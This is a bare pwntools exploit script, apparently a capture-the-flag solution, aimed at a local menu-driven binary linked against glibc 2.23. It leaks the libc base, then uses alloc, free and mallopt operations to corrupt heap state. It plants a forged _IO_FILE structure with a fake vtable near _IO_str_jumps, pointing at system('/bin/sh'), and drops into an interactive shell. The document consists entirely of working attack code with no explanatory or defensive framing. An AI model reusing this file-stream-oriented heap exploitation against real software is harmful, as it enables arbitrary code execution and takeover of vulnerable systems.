from pwn import*
def S(ch):
	p.sendlineafter('>',str(ch))
def alloc(size,content):
	S(1)
	S(size)
	p.sendafter('>',content)
def free():
	S(2)
	
def mallopt(param,n):
	S(3)
	S(param)
	S(n)
def gift(size,content):
	S(4)
	S(size)
	p.sendafter('>',content)
p = process('./main')
libc =ELF('./libc-2.23.so')
p.recvuntil('Your Gift : ')
libc_base = int(p.recv(14),16) - libc.sym['puts']
log.info('LIBC:\t' + hex(libc_base))
S(0x4FF)
S('FMYY')
alloc(0x18,'FMYY')
free()
alloc(0x18,'FMYY')
mallopt(1,7)
mallopt(1,0x78)
gift(0x4FF,'\x78')
IO_list_all = libc_base + libc.sym['_IO_list_all']
IO_str_jumps = libc_base +libc.symbols['_IO_file_jumps'] + 0xC0
fake_IO  = p64(0) + p64(0)
fake_IO += p64(0) + p64(0)
fake_IO += p64(0) + p64(1)
fake_IO += p64(0) + p64(libc_base+libc.search('/bin/sh').next())
fake_IO  = fake_IO.ljust(0xD8,'\x00')
fake_IO += p64(IO_str_jumps - 8)
fake_IO += p64(0) + p64(libc_base + libc.sym['system'])

gift(0x470,fake_IO)
gift(0x410,'\x00'*8 + p64(libc_base + libc.sym['__malloc_hook'] + 1400 + 0x10))
S(5)
p.interactive()
